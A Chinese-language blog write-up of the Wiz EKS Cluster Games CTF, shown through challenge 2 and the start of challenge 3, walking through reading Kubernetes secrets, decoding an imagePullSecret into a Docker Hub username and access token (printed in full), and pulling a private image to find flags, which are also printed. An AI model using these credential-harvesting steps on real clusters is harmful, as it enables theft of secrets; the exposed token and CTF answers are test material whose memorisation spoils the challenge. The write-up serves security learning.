<!DOCTYPE html>
<html lang=en>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="format-detection" content="telephone=no,email=no,adress=no">
  <!-- Color theme for statusbar -->
  <meta name="theme-color" content="#000000" />
  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
  <meta http-equiv="window-target" content="_top" />
  
  
  <title>跟WIZ学K8s安全与云安全--CTF挑战赛 | Polo&#39;s Blog</title>
  <meta name="description" content="最近在看WIZ的CTF挑战，做了一下还挺有意思，记录一下在做题时遇到的问题和知识点。 挑战链接：https:&#x2F;&#x2F;eksclustergames.com&#x2F;challenge&#x2F; 本次挑战需要的前置知识主要有 123451.K8S运维命令，如kubectl describe&#x2F;get2.AWS s3 常用命令3.AWS s3 CLI 身份配置4.AWS IAM5.AWS sts安全凭证管理  建">
<meta property="og:type" content="article">
<meta property="og:title" content="跟WIZ学K8s安全与云安全--CTF挑战赛">
<meta property="og:url" content="https://polosec.github.io/2023/12/24/%E4%B8%AA/index.html">
<meta property="og:site_name" content="Polo&#39;s Blog">
<meta property="og:description" content="最近在看WIZ的CTF挑战，做了一下还挺有意思，记录一下在做题时遇到的问题和知识点。 挑战链接：https:&#x2F;&#x2F;eksclustergames.com&#x2F;challenge&#x2F; 本次挑战需要的前置知识主要有 123451.K8S运维命令，如kubectl describe&#x2F;get2.AWS s3 常用命令3.AWS s3 CLI 身份配置4.AWS IAM5.AWS sts安全凭证管理  建">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224132456810.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224132647269.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224133600445.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224134013637.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224134639022.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224134706711.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224134809165.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224135956677.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224140044059.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224140630965.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224142258171.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224142903732.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224143947159.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224144951158.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224145054792.png">
<meta property="og:image" content="http://cdn.polowong.top/image-20231224145130399.png">
<meta property="article:published_time" content="2023-12-24T07:30:18.000Z">
<meta property="article:modified_time" content="2023-12-24T07:30:45.505Z">
<meta property="article:author" content="Polo">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://cdn.polowong.top/image-20231224132456810.png">
  <!-- Canonical links -->
  <link rel="canonical" href="https://polosec.github.io/2023/12/24/%E4%B8%AA/index.html">
  
    <link rel="alternate" href="/atom.xml" title="Polo&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png" type="image/x-icon">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  
  
    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
  
  
<meta name="generator" content="Hexo 5.4.0"></head>


<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
  <div class="slimContent">
    <div class="navbar-header">
      
      
      <div class="profile-block text-center">
        <a id="avatar" href="https://github.com/polosec" target="_blank">
          <img class="img-circle img-rotate" src="http://cdn.polowong.top/1.jpg" width="200" height="200">
        </a>
        <h2 id="name" class="hidden-xs hidden-sm">Polo</h2>
        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer&amp;Cybersec Researcher</h3>
        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
      </div>
      
      <div class="search" id="search-form-wrap">

    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="Search" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
            </span>
        </div>
    </form>
    <div class="ins-search">
  <div class="ins-search-mask"></div>
  <div class="ins-search-container">
    <div class="ins-input-wrapper">
      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
    </div>
    <div class="ins-section-wrapper">
      <div class="ins-section-container"></div>
    </div>
  </div>
</div>


</div>
      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>
    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
      <ul class="nav navbar-nav main-nav ">
        
        
        <li class="menu-item menu-item-home">
          <a href="/.">
            
            <i class="icon icon-home-fill"></i>
            
            <span class="menu-title">Home</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-archives">
          <a href="/archives">
            
            <i class="icon icon-archives-fill"></i>
            
            <span class="menu-title">Archives</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-about">
          <a href="/about">
            
            <i class="icon icon-cup-fill"></i>
            
            <span class="menu-title">About</span>
          </a>
        </li>
        
      </ul>
      
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
        
    </ul>

    </nav>
  </div>
</header>

  
    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    
      <div class="widget">
    <h3 class="widget-title">Board</h3>
    <div class="widget-body">
        <div id="board">
            <div class="content">
                <p>null</p>
            </div>
        </div>
    </div>
</div>

    
      
  <div class="widget">
    <h3 class="widget-title">Categories</h3>
    <div class="widget-body">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wp/">wp</a><span class="category-list-count">5</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">Tags</h3>
    <div class="widget-body">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0307xctf/" rel="tag">0307xctf</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c%E8%AF%AD%E8%A8%80/" rel="tag">c语言</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensic/" rel="tag">forensic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meiyacup/" rel="tag">meiyacup</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rdg/" rel="tag">rdg</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%96%E8%AF%81/" rel="tag">取证</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" rel="tag">红队技能</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget-body tagcloud">
      <a href="/tags/0307xctf/" style="font-size: 13.33px;">0307xctf</a> <a href="/tags/awd/" style="font-size: 13.5px;">awd</a> <a href="/tags/buu/" style="font-size: 13.5px;">buu</a> <a href="/tags/buuoj/" style="font-size: 13.5px;">buuoj</a> <a href="/tags/c/" style="font-size: 13px;">c++</a> <a href="/tags/ctf/" style="font-size: 13px;">ctf</a> <a href="/tags/c%E8%AF%AD%E8%A8%80/" style="font-size: 13px;">c语言</a> <a href="/tags/forensic/" style="font-size: 13px;">forensic</a> <a href="/tags/git/" style="font-size: 13px;">git</a> <a href="/tags/linux/" style="font-size: 13.17px;">linux</a> <a href="/tags/meiyacup/" style="font-size: 13px;">meiyacup</a> <a href="/tags/misc/" style="font-size: 13.83px;">misc</a> <a href="/tags/mysql/" style="font-size: 13.17px;">mysql</a> <a href="/tags/php/" style="font-size: 13.67px;">php</a> <a href="/tags/rdg/" style="font-size: 13.33px;">rdg</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 13px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 13.17px;">内网渗透</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13px;">反序列化</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size: 13px;">取证</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 13.17px;">密码学</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 13px;">杂项</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 13px;">流量分析</a> <a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" style="font-size: 13px;">红队技能</a> <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 13.17px;">网络</a>
    </div>
  </div>

    
      
  <div class="widget">
    <h3 class="widget-title">Archive</h3>
    <div class="widget-body">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">16</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget-body">
      <ul class="recent-post-list list-unstyled no-thumbnail">
        
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2023/12/24/%E4%B8%AA/" class="title">跟WIZ学K8s安全与云安全--CTF挑战赛</a>
              </p>
              <p class="item-date">
                <time datetime="2023-12-24T07:30:18.000Z" itemprop="datePublished">2023-12-24</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2023/12/22/%E7%8E%84%E6%9C%BA-ER-01/" class="title">玄机应急响应靶场-redis-mysql-BT3-权限维持</a>
              </p>
              <p class="item-date">
                <time datetime="2023-12-22T13:02:39.000Z" itemprop="datePublished">2023-12-22</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/" class="title">AWD不死马分析</a>
              </p>
              <p class="item-date">
                <time datetime="2023-07-01T12:16:14.000Z" itemprop="datePublished">2023-07-01</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2022/11/14/%E5%9B%9B%E5%B7%9D%E7%9C%81%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-AWD%E9%83%A8%E5%88%86WriteUp/" class="title">四川省信息安全技术大赛 AWD部分WriteUp</a>
              </p>
              <p class="item-date">
                <time datetime="2022-11-14T13:52:55.000Z" itemprop="datePublished">2022-11-14</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2022/10/23/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-ez-forensic/" class="title">2022巅峰极客_ez_forensic</a>
              </p>
              <p class="item-date">
                <time datetime="2022-10-23T14:52:26.000Z" itemprop="datePublished">2022-10-23</time>
              </p>
            </div>
          </li>
          
      </ul>
    </div>
  </div>
  

    
  </div>
</aside>

  
  
<main class="main" role="main">
  <div class="content">
  <article id="post-个" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      
        
  
    <h1 class="article-title" itemprop="name">
      跟WIZ学K8s安全与云安全--CTF挑战赛
    </h1>
  

      
      <div class="article-meta">
        <span class="article-date">
    <i class="icon icon-calendar-check"></i>
	<a href="/2023/12/24/%E4%B8%AA/" class="article-date">
	  <time datetime="2023-12-24T07:30:18.000Z" itemprop="datePublished">2023-12-24</time>
	</a>
</span>
        
        

        
	<span class="article-read hidden-xs">
	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
	    <span id="busuanzi_container_page_pv">
			<span id="busuanzi_value_page_pv">0</span>
		</span>
	</span>


        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/12/24/%E4%B8%AA/#comments" class="article-comment-link">Comments</a></span>
        
	
		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 2.6k(words)</span>
	
	
		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 12(minutes)</span>
	

      </div>
    </div>
    <div class="article-entry marked-body" itemprop="articleBody">
      
        <p>最近在看WIZ的CTF挑战，做了一下还挺有意思，记录一下在做题时遇到的问题和知识点。</p>
<p>挑战链接：<a target="_blank" rel="noopener" href="https://eksclustergames.com/challenge/">https://eksclustergames.com/challenge/</a></p>
<p>本次挑战需要的前置知识主要有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.K8S运维命令，如kubectl describe&#x2F;get</span><br><span class="line">2.AWS s3 常用命令</span><br><span class="line">3.AWS s3 CLI 身份配置</span><br><span class="line">4.AWS IAM</span><br><span class="line">5.AWS sts安全凭证管理</span><br></pre></td></tr></table></figure>

<p>建议先熟悉aws s3基础命令与kubectl 基础命令，然后进行挑战。</p>
<h2 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h2><p>题目描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Secret Seeker</span><br><span class="line"></span><br><span class="line">Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</span><br><span class="line"></span><br><span class="line">通过列出集群中的所有秘密来启动您的任务。你能在他们中间认出那面旗帜吗?</span><br></pre></td></tr></table></figure>

<p>根据题目描述，这题应该是和k8s的secret相关。</p>
<p>在K8S中，<strong>secret</strong>用来保存小片敏感数据的k8s资源，例如密码，token，或者秘钥。我理解的secret是k8s中的一种资源类型</p>
<p>本题对当前用户secret资源的权限是get和list</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;secrets&quot;: [</span><br><span class="line">        &quot;get&quot;,</span><br><span class="line">        &quot;list&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么就可以直接用kubectl去查看</p>
<p><img src="http://cdn.polowong.top/image-20231224132456810.png" alt="image-20231224132456810"></p>
<p>使用命令kubectl get secret  secret_name -o json查看secret的具体内容，使用describe命令看不到secret的具体内容，所以这里用get，使用**-o**指定输出格式为json</p>
<p><img src="http://cdn.polowong.top/image-20231224132647269.png" alt="image-20231224132647269"></p>
<p>Flag1:wiz_eks_challenge{omg_over_privileged_secret_access}</p>
<h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><p>题目描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Registry Hunt</span><br><span class="line"></span><br><span class="line">A thing we learned during our research: always check the container registries.</span><br><span class="line"></span><br><span class="line">For your convenience, the [crane](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;go-containerregistry&#x2F;blob&#x2F;main&#x2F;cmd&#x2F;crane&#x2F;doc&#x2F;crane.md) utility is already pre-installed on the machine.</span><br><span class="line"></span><br><span class="line">我们在研究过程中学到的一件事是:总是检查容器注册表。为方便起见，[crane](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;go-containerregistry&#x2F;blob&#x2F;main&#x2F;cmd&#x2F;crane&#x2F;doc&#x2F;crane.md)实用程序已经预装在机器上。</span><br></pre></td></tr></table></figure>

<p>当前用户对k8s资源的权限为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;secrets&quot;: [</span><br><span class="line">        &quot;get&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;pods&quot;: [</span><br><span class="line">        &quot;list&quot;,</span><br><span class="line">        &quot;get&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以get secret，list get pod</p>
<p>先看一下secrets和pods里面有什么</p>
<p>secret没有list权限，看下hint，hint2是Reading about ImagePullSecrets might be useful ，提示找ImagePullSecrets。</p>
<p>经过搜索发现，ImagePullSecrets在image的配置中</p>
<p><img src="http://cdn.polowong.top/image-20231224133600445.png" alt="image-20231224133600445"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pod database-pod-2c9b3a4e -o json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">    &quot;kind&quot;: &quot;Pod&quot;,</span><br><span class="line">    &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">            &quot;kubernetes.io&#x2F;psp&quot;: &quot;eks.privileged&quot;,</span><br><span class="line">            &quot;pulumi.com&#x2F;autonamed&quot;: &quot;true&quot;</span><br><span class="line">...</span><br><span class="line">                &quot;imageID&quot;: &quot;docker.io&#x2F;eksclustergames&#x2F;base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623&quot;,</span><br><span class="line">                ....</span><br><span class="line">        &quot;imagePullSecrets&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;name&quot;: &quot;registry-pull-secrets-780bab1d&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>现在已经拿到了ImagePullSecrets，hint1是Try obtaining the container registry credentials to pull container images and examine them for sensitive secrets.提示我们可能有机密文件藏在容器镜像里面，那么我们接下来需要做的就是获取容器镜像。</p>
<p>在我本机直接docker pull试试，提示没有权限</p>
<p><img src="http://cdn.polowong.top/image-20231224134013637.png" alt="image-20231224134013637"></p>
<p>那么考虑这是一个私有的docker镜像仓库，需要login进去。</p>
<p>目前我们已经有imagePullSecrets，通过<strong>kubectl get secrets registry-pull-secrets-780bab1d -o json</strong>命令可以查看这个secrets</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets registry-pull-secrets-780bab1d -o json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;.dockerconfigjson&quot;: &quot;eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;kind&quot;: &quot;Secret&quot;,</span><br><span class="line">    &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">            &quot;pulumi.com&#x2F;autonamed&quot;: &quot;true&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;creationTimestamp&quot;: &quot;2023-11-01T13:31:29Z&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;registry-pull-secrets-780bab1d&quot;,</span><br><span class="line">        &quot;namespace&quot;: &quot;challenge2&quot;,</span><br><span class="line">        &quot;resourceVersion&quot;: &quot;897340&quot;,</span><br><span class="line">        &quot;uid&quot;: &quot;1348531e-57ff-42df-b074-d9ecd566e18b&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;type&quot;: &quot;kubernetes.io&#x2F;dockerconfigjson&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解base64 可以看到docker登录信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;auths&quot;: &#123;&quot;index.docker.io&#x2F;v1&#x2F;&quot;: &#123;&quot;auth&quot;: &quot;ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw&#x3D;&#x3D;&quot;&#125;&#125;&#125;</span><br><span class="line">再解一次 </span><br><span class="line">eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</span><br></pre></td></tr></table></figure>

<p>然后 docker login</p>
<p><img src="http://cdn.polowong.top/image-20231224134639022.png" alt="image-20231224134639022"></p>
<p>到这里就是docker登录成功了，重复刚才pull的操作，可以看到pull是没问题的</p>
<p><img src="http://cdn.polowong.top/image-20231224134706711.png" alt="image-20231224134706711"></p>
<p>然后查看一下image的历史记录</p>
<p><img src="http://cdn.polowong.top/image-20231224134809165.png" alt="image-20231224134809165"></p>
<p>找到flag2 <strong>wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}</strong></p>
<h2 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h2><p>题目描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Image Inquisition</span><br><span class="line">A pod&#39;s image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.</span><br><span class="line"></span><br><span class="line">Remember: You are running inside a compromised EKS pod.</span><br><span class="line"></span><br><span class="line">For your convenience, the crane utility is already pre-installed on the machine.</span><br></pre></td></tr></table></figure>

<p>EKS 是 AWS 提供的托管 K8S 集群，<strong>Amazon Elastic Container Registry</strong> (ECR) 是一种完全托管的 Docker 容器注册表，开发人员可使用它轻松存储、管理和部署 Docker 容器镜像。</p>
<p>当前的权限只有get/list pods，先看一下pods里面有什么</p>
